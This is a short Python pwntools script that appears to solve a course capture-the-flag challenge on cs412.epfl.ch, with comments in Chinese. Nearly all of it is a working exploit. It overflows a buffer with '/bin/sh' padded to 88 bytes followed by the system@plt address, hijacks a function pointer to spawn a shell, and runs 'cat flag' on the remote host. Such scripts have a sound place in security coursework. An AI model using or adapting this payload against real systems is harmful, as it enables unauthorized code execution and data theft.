from pwn import *

HOST = "cs412.epfl.ch"
PORT = 9035
elf = ELF("./chal")

conn = remote(HOST, PORT)
conn.recvuntil(b"> ")

def send_cmd(cmd):
    conn.sendline(str(cmd).encode())

# 直接覆盖write为system@plt，object放'/bin/sh'
payload = b"/bin/sh\x00".ljust(88, b"A") + p64(elf.plt["system"])

send_cmd(1)
conn.sendline(payload)
conn.recvuntil(b"> ")

# 调用system("/bin/sh")
send_cmd(2)

# 直接执行命令拿flag（不进interactive模式）
conn.sendline(b"cat flag")
print(conn.recvline())

conn.close()
